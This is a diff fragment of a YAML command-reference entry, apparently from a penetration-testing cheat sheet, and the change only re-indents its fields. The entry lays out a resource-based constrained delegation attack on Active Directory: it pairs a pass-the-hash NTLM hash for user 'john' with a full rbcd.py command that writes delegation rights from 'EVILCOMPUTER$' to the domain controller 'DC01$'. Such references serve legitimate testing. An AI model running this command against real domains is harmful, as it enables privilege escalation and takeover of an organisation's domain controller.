@@ -6,17 +6,17 @@ description: |
 
   Command Reference:
 
-    Target IP: 10.10.10.1
+      Target IP: 10.10.10.1
 
-    Domain: test.local
+      Domain: test.local
 
-    Username: john
+      Username: john
 
-    Hash: :A9FDFA038C4B75EBC76DC855DD74F0DA
+      Hash: :A9FDFA038C4B75EBC76DC855DD74F0DA
 
-    Delegate To: DC01$
+      Delegate To: DC01$
 
-    Delegate From: EVILCOMPUTER$
+      Delegate From: EVILCOMPUTER$
 
 command: |
   python3 rbcd.py -action write -delegate-to "DC01$" -delegate-from "EVILCOMPUTER$" -dc-ip 10.10.10.1 -hashes :A9FDFA038C4B75EBC76DC855DD74F0DA test.local/john
